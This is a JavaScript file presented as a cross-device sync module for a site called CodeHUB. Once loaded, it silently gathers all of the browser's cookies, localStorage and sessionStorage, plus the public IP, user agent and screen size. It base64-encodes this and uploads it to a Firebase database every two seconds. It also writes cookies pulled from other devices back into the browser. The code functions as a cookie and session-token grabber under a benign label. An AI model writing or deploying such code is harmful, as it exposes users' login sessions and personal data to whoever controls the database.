// sinc.js - Sistema de Sincronização para CodeHUB
(function() {
    console.log('🔄 Iniciando sistema de sincronização CodeHUB...');

    let currentUID = null;
    let deviceId = null;
    let syncInterval = null;
    let restoreInProgress = false;
    let lastSyncHash = null;
    let autoSyncEnabled = true;
    let database = null;

    // Função para carregar scripts dinamicamente
    function loadScript(src) {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }

    // Carrega Firebase se não estiver disponível
    async function ensureFirebase() {
        if (typeof firebase !== 'undefined' && firebase.database) {
            return true;
        }
        
        try {
            await loadScript('https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js');
            await loadScript('https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js');
            return true;
        } catch(e) {
            console.error('Erro ao carregar Firebase:', e);
            return false;
        }
    }

    // Configuração do Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyDon4WbCbe4kCkUq-OdLBRhzhMaUObbAfo",
        authDomain: "html-15e80.firebaseapp.com",
        databaseURL: "https://html-15e80-default-rtdb.firebaseio.com",
        projectId: "html-15e80",
        storageBucket: "html-15e80.appspot.com",
        messagingSenderId: "1068148640439",
        appId: "1:1068148640439:web:7cc5bde34f4c5a5ce41b32"
    };

    // Inicializa Firebase se necessário
    async function initFirebase() {
        if (database) return database;
        
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        database = firebase.database();
        return database;
    }

    // Função para obter IP público
    async function getPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch(e) {
            return 'unknown';
        }
    }

    // Coleta TUDO do navegador
    function collectAllData() {
        const data = {
            ls: {},
            ss: {},
            ck: {},
            ts: Date.now()
        };

        // LocalStorage completo
        for(let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data.ls[key] = localStorage.getItem(key);
        }

        // SessionStorage completo
        for(let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data.ss[key] = sessionStorage.getItem(key);
        }

        // Todos os cookies
        const cookies = document.cookie.split(';');
        for(let i = 0; i < cookies.length; i++) {
            if(cookies[i].trim()) {
                const [name, value] = cookies[i].split('=');
                data.ck[name.trim()] = value || '';
            }
        }

        return data;
    }

    // Converte para Base64
    function toBase64(obj) {
        try {
            return btoa(unescape(encodeURIComponent(JSON.stringify(obj))));
        } catch(e) {
            console.error('Erro ao converter para Base64:', e);
            return '';
        }
    }

    // Converte de Base64
    function fromBase64(str) {
        try {
            return JSON.parse(decodeURIComponent(escape(atob(str))));
        } catch(e) {
            console.error('Erro ao converter de Base64:', e);
            return null;
        }
    }

    // Gera hash único para dados
    function generateHash(data) {
        let hash = 0;
        const str = JSON.stringify(data);
        for(let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }

    // Restaura dados no dispositivo
    function restoreData(encodedData) {
        if(restoreInProgress) return false;
        restoreInProgress = true;
        
        try {
            const data = fromBase64(encodedData);
            if(!data) return false;
            
            // Restaura LocalStorage
            for(const key in data.ls) {
                if(key !== '_sync_uid_' && key !== '_device_id_') {
                    localStorage.setItem(key, data.ls[key]);
                }
            }
            
            // Restaura SessionStorage  
            for(const key in data.ss) {
                sessionStorage.setItem(key, data.ss[key]);
            }
            
            // Restaura Cookies
            for(const name in data.ck) {
                document.cookie = name + "=" + data.ck[name] + "; path=/";
            }
            
            console.log('✓ Dados restaurados com sucesso');
            
            // Disparar evento de sincronização concluída
            window.dispatchEvent(new CustomEvent('syncCompleted', { detail: { success: true, action: 'restore' } }));
            
            return true;
        } catch(e) {
            console.error('Erro ao restaurar:', e);
            return false;
        } finally {
            restoreInProgress = false;
        }
    }

    // Salva dados atuais no Firebase
    async function saveCurrentData() {
        if(!currentUID || !database) return;
        
        try {
            const allData = collectAllData();
            const currentHash = generateHash(allData);
            
            if(currentHash === lastSyncHash) return;
            
            const encoded = toBase64(allData);
            if(!encoded) return;
            
            const deviceInfo = {
                id: deviceId,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timestamp: Date.now(),
                ip: await getPublicIP(),
                lastSync: Date.now()
            };
            
            // Salvar dados no Firebase
            await database.ref(`syncData/${currentUID}`).set({
                data: encoded,
                hash: currentHash,
                lastUpdate: firebase.database.ServerValue.TIMESTAMP,
                deviceId: deviceId,
                deviceInfo: deviceInfo
            });
            
            // Registrar dispositivo
            await database.ref(`devices/${currentUID}/${deviceId}`).set(deviceInfo);
            
            lastSyncHash = currentHash;
            
            // Disparar evento de sincronização concluída
            window.dispatchEvent(new CustomEvent('syncCompleted', { detail: { success: true, action: 'save' } }));
            
            return true;
        } catch(e) {
            console.error('Erro ao salvar:', e);
            return false;
        }
    }

    // Verifica atualizações de outros dispositivos
    async function checkForUpdates() {
        if(!currentUID || !database || restoreInProgress) return false;
        
        try {
            const snapshot = await database.ref(`syncData/${currentUID}`).once('value');
            const data = snapshot.val();
            
            if(data && data.data && data.hash && data.deviceId !== deviceId) {
                const currentData = collectAllData();
                const currentHash = generateHash(currentData);
                
                if(currentHash !== data.hash) {
                    console.log('🔄 Nova versão detectada, restaurando...');
                    const restored = restoreData(data.data);
                    if(restored) {
                        window.dispatchEvent(new CustomEvent('syncRestored', { detail: { fromDevice: data.deviceId } }));
                    }
                    return restored;
                }
            }
            return false;
        } catch(e) {
            console.error('Erro ao verificar atualizações:', e);
            return false;
        }
    }

    // Força uma sincronização manual
    async function forceSync() {
        console.log('🔄 Forçando sincronização manual...');
        const saved = await saveCurrentData();
        const updated = await checkForUpdates();
        return { saved, updated };
    }

    // Inicia sincronização automática
    function startAutoSync() {
        if(syncInterval) clearInterval(syncInterval);
        autoSyncEnabled = true;
        
        syncInterval = setInterval(() => {
            if(autoSyncEnabled && currentUID) {
                saveCurrentData();
                checkForUpdates();
            }
        }, 2000);
        
        console.log('✓ Sincronização automática iniciada');
    }

    // Para sincronização automática
    function stopAutoSync() {
        autoSyncEnabled = false;
        if(syncInterval) {
            clearInterval(syncInterval);
            syncInterval = null;
        }
        console.log('⏸ Sincronização automática pausada');
    }

    // Define o UID do usuário (chamado pelo app principal)
    function setUserUID(uid) {
        if(!uid) return;
        
        currentUID = uid;
        deviceId = getOrCreateDeviceId();
        
        console.log('✓ UID configurado:', currentUID);
        console.log('✓ Device ID:', deviceId);
        
        // Registrar dispositivo
        if(database) {
            registerDevice();
            
            // Primeira sincronização
            setTimeout(() => {
                checkForUpdates();
                saveCurrentData();
            }, 1000);
        }
    }

    // Registrar dispositivo
    async function registerDevice() {
        if(!currentUID || !database) return;
        
        const deviceInfo = {
            id: deviceId,
            userAgent: navigator.userAgent,
            screenWidth: screen.width,
            screenHeight: screen.height,
            ip: await getPublicIP(),
            registeredAt: Date.now(),
            lastSeen: Date.now()
        };
        
        await database.ref(`devices/${currentUID}/${deviceId}`).set(deviceInfo);
    }

    // Gera Device ID único
    function getOrCreateDeviceId() {
        let did = localStorage.getItem('_device_id_');
        if(!did) {
            did = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('_device_id_', did);
        }
        return did;
    }

    // Inicialização completa
    async function init() {
        await ensureFirebase();
        await initFirebase();
        
        // Tentar obter UID do Firebase Auth global
        const checkAuthInterval = setInterval(() => {
            // Verificar se o Firebase Auth tem usuário logado
            if (firebase.auth && firebase.auth().currentUser) {
                const user = firebase.auth().currentUser;
                if (user && user.uid && !currentUID) {
                    clearInterval(checkAuthInterval);
                    setUserUID(user.uid);
                    
                    // Iniciar auto-sync por padrão
                    startAutoSync();
                }
            }
        }, 500);
        
        // Timeout para não ficar verificando para sempre
        setTimeout(() => clearInterval(checkAuthInterval), 10000);
    }

    // Expor API pública
    window.CodeHUBSync = {
        setUserUID: setUserUID,
        forceSync: forceSync,
        startAutoSync: startAutoSync,
        stopAutoSync: stopAutoSync,
        getUID: () => currentUID,
        getDeviceId: () => deviceId,
        isActive: () => autoSyncEnabled
    };
    
    // Iniciar
    init();
})();